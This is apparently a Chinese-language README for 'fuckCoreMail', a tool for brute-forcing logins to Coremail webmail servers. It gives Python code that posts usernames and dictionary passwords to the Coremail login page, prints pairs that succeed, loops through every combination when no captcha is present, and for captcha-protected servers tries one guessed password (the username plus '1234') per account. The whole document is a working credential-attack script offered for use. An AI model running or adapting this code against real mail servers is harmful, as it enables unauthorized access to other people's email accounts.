# fuckCoreMail爆破说明书

*email.txt为用户的邮箱
password.txt 为用户密码字典*
```           
self.data = {'local':'zh_CN', 'uid': self.email, 'nodetect':'false', 'password': self.password,'action:login': ''}
            self.url = 'https://' + self.mailDomain + '/coremail/index.jsp?cus=1'
            self.req = self.session.post(self.url,self.data, verify=False)
            if r'cexpand' in self.req.text:
                print self.data
            time.sleep(3)

```
如果爆破成功打印self.data
**当coremail没有验证码限制的时候，可以用fuckCoreMail.py做为爆破**
可以循环爆破
```
    with open('email.txt', 'r') as f:
        with open('password.txt', 'r') as p:
            for emailUser in f.readlines():
                for emailPass in p.readlines():
                    fuckMail = ClmbFuckCoreMail('mail.xxx.com.cn', emailUser.strip(), emailPass.strip())
                    fuckMail.run()
                p.seek(0)
```


**当coremail有验证码限制的时候，可以用fuckCoreMailVerify.py做为爆破**
采用一人密码只尝试一次



```
    with open('email.txt', 'r') as f:
            for emailUser in f.readlines():
                    fuckMail = ClmbFuckCoreMail('mail.xxx.com.cn', emailUser.strip(), emailUser.strip() + '1234') //1234加在用户名后面为组合字典
                    fuckMail.run()

```